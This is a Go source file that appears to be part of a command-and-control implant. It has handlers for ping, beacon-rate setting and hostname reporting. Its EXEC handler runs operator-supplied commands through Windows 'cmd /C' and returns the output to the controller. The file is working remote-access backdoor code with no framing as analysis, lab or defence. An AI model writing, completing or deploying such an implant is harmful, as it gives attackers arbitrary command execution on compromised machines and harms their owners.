package main

import (
	"os/exec"
	"strconv"
	"strings"
)

func CmdPing(c *Client) {
	c.pushMessage("PONG")
}

func CmdSet(c *Client, msgArgs []string) {
	if len(msgArgs) != 4 {
		//fmt.Printf("Malformed SET command: %v\n", msgArgs)
		return
	}
	switch msgArgs[2] {
	case "BEACONRATE":
		rate, err := strconv.Atoi(strings.TrimSpace(msgArgs[3]))
		if err != nil {
			//fmt.Printf("Malformed SET command, argument cannot convert to int: %v\n", msgArgs)
			return
		}
		c.beaconRate = rate
		return
	default:
		//fmt.Printf("SET option: %s not defined", msgArgs[2])
		return
	}

}

func CmdHost(c *Client) {
	c.pushMessage("HOST", []string{c.hostname}...)
}

func CmdExec(c *Client, msgArgs []string) {
	var args []string

	if len(msgArgs) <= 2 {
		//fmt.Printf("Malformed EXEC command: %v\n", msgArgs)
		return
	}
	if len(msgArgs) >= 4 {
		args = msgArgs[2:]
		// Prepend "/C" to the args
		args = append([]string{"/C"}, args...)
	} else {
		args = []string{"/C", msgArgs[2]}
	}
	//fmt.Printf("args: %v\n", args)
	out, err := exec.Command("cmd", args...).CombinedOutput()
	if err != nil {
		c.PushInterMessage(string(out))
		return
	}
	c.PushInterMessage(string(out))
}
